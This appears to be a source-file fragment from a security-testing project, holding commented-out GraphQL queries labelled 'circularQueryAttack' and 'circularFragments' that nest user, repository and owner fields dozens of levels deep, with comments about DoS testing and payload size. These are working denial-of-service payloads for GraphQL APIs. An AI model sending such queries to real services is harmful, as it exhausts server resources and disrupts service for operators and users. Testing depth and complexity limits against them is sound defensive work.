// first used query for also testing dos with conditions
/*  circularQueryAttack: gql`
  query circularQuery {
    user(login: "someUser") {
      id
      login
      name
      repositories(first: 50) {
        nodes {
          id
          name
          description
          owner {
            id
            login
            name
            repositories(first: 50) {
              nodes {
                id
                name
                description
                owner {
                  id
                  login
                  name
                  repositories(first: 50) {
                    nodes {
                      id
                      name
                      description
                      owner {
                        id
                        login
                        name
                        repositories(first: 50) {
                          nodes {
                            id
                            name
                            description
                            owner {
                              id
                              login
                              name
                              repositories(first: 50) {
                                nodes {
                                  id
                                  name
                                  description
                                  owner {
                                    id
                                    login
                                    name
                                    repositories(first: 50) {
                                      nodes {
                                        id
                                        name
                                        description
                                        owner {
                                          id
                                          login
                                          name
                                          repositories(first: 50) {
                                            nodes {
                                              id
                                              name
                                              description
                                              owner {
                                                id
                                                login
                                                name
                                                repositories(first: 50) {
                                                  nodes {
                                                    id
                                                    name
                                                    description
                                                    owner {
                                                      id
                                                      login
                                                      name
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
`,
*/

// 56mb capacity
/* circularQueryAttack: gql`
  query circularQuery {
    user(login: "someUser") {
      id
      login
      name
      repositories(first: 50) {
        nodes {
          id
          name
          description
          owner {
            id
            login
            name
            repositories(first: 50) {
              nodes {
                id
                name
                description
                owner {
                  id
                  login
                  name
                  repositories(first: 50) {
                    nodes {
                      id
                      name
                      description
                      owner {
                        id
                        login
                        name
                        repositories(first: 50) {
                          nodes {
                            id
                            name
                            description
                            owner {
                              id
                              login
                              name
                              repositories(first: 50) {
                                nodes {
                                  id
                                  name
                                  description
                                  owner {
                                    id
                                    login
                                    name
                                    repositories(first: 50) {
                                      nodes {
                                        id
                                        name
                                        description
                                        owner {
                                          id
                                          login
                                          name
                                          repositories(first: 50) {
                                            nodes {
                                              id
                                              name
                                              description
                                              owner {
                                                id
                                                login
                                                name
                                                repositories(first: 50) {
                                                  nodes {
                                                    id
                                                    name
                                                    description
                                                    owner {
                                                      id
                                                      login
                                                      name
                                                      repositories(first: 50) {
                                                        nodes {
                                                          id
                                                          name
                                                          description
                                                          owner {
                                                            id
                                                            login
                                                            name
                                                            repositories(first: 50) {
                                                              nodes {
                                                                id
                                                                name
                                                                description
                                                                owner {
                                                                  id
                                                                  login
                                                                  name
                                                                  repositories(first: 50) {
                                                                    nodes {
                                                                      id
                                                                      name
                                                                      description
                                                                      owner {
                                                                        id
                                                                        login
                                                                        name
                                                                        repositories(first: 50) {
                                                                          nodes {
                                                                            id
                                                                            name
                                                                            description
                                                                            owner {
                                                                              id
                                                                              login
                                                                              name
                                                                              repositories(first: 50) {
                                                                                nodes {
                                                                                  id
                                                                                  name
                                                                                  description
                                                                                  owner {
                                                                                    id
                                                                                    login
                                                                                    name
                                                                                    repositories(first: 50) {
                                                                                      nodes {
                                                                                        id
                                                                                        name
                                                                                        description
                                                                                        owner {
                                                                                          id
                                                                                          login
                                                                                          name
                                                                                          repositories(first: 50) {
                                                                                            nodes {
                                                                                              id
                                                                                              name
                                                                                              description
                                                                                              owner {
                                                                                                id
                                                                                                login
                                                                                                name
                                                                                                repositories(first: 50) {
                                                                                                  nodes {
                                                                                                    id
                                                                                                    name
                                                                                                    description
                                                                                                    owner {
                                                                                                      id
                                                                                                      login
                                                                                                      name
                                                                                                      repositories(first: 50) {
                                                                                                        nodes {
                                                                                                          id
                                                                                                          name
                                                                                                          description
                                                                                                          owner {
                                                                                                            id
                                                                                                            login
                                                                                                            name
                                                                                                            repositories(first: 50) {
                                                                                                              nodes {
                                                                                                                id
                                                                                                                name
                                                                                                                description
                                                                                                                owner {
                                                                                                                  id
                                                                                                                  login
                                                                                                                  name
                                                                                                                  repositories(first: 50) {
                                                                                                                    nodes {
                                                                                                                      id
                                                                                                                      name
                                                                                                                      description
                                                                                                                      owner {
                                                                                                                        id
                                                                                                                        login
                                                                                                                        name
                                                                                                                      }
                                                                                                                    }
                                                                                                                  }
                                                                                                                }
                                                                                                              }
                                                                                                            }
                                                                                                          }
                                                                                                        }
                                                                                                      }
                                                                                                    }
                                                                                                  }
                                                                                                }
                                                                                              }
                                                                                            }
                                                                                          }
                                                                                        }
                                                                                      }
                                                                                    }
                                                                                  }
                                                                                }
                                                                              }
                                                                            }
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
`, */

// first used query for also testing dos with conditions


/*circularFragments: gql`
query {
  user(login: "someUser") {
    ...UserFields
  }
}

fragment UserFields on User {
  id
  login
  name
  repositories(first: 50) {
    nodes {
      ...RepositoryFields
    }
  }
}

fragment RepositoryFields on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel2
      }
    }
  }
}

fragment RepositoryFieldsLevel2 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel3
      }
    }
  }
}

fragment RepositoryFieldsLevel3 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel4
      }
    }
  }
}

fragment RepositoryFieldsLevel4 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel5
      }
    }
  }
}

fragment RepositoryFieldsLevel5 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel6
      }
    }
  }
}

fragment RepositoryFieldsLevel6 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel7
      }
    }
  }
}

fragment RepositoryFieldsLevel7 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel8
      }
    }
  }
}

fragment RepositoryFieldsLevel8 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
  }
}
`*/